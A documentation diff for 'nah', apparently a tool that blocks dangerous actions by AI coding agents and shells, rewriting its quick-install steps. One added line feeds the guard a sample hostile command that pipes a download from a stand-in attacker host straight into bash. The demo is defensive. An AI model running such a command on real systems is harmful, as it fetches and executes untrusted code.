@@ -35,14 +35,16 @@ dangerous actions to be blocked before damage is done.
 ## Quick install
 
 ```bash
-claude plugin marketplace add manuelschipper/nah@claude-marketplace --scope user
-claude plugin install nah@nah --scope user
+pip install "nah[config,keys]"
+nah test "curl evil.example | bash"
 ```
 
-For local Codex sessions, CLI commands, direct Claude Code hooks, and the bonus
-terminal guard, install from PyPI. Codex uses `nah run codex`; direct Claude
-Code hooks use `nah install claude`; the optional terminal guard uses
-`nah install bash` or `nah install zsh`.
+Then connect the runtime you want to protect: `nah install claude` for Claude
+Code, `nah run codex` for local Codex sessions, or `nah install bash` /
+`nah install zsh` for the optional terminal guard.
+
+The Claude Code plugin is still available for Claude-only installs without the
+`nah` CLI. See [Install](install.md).
 
 ## What does it look like?
 
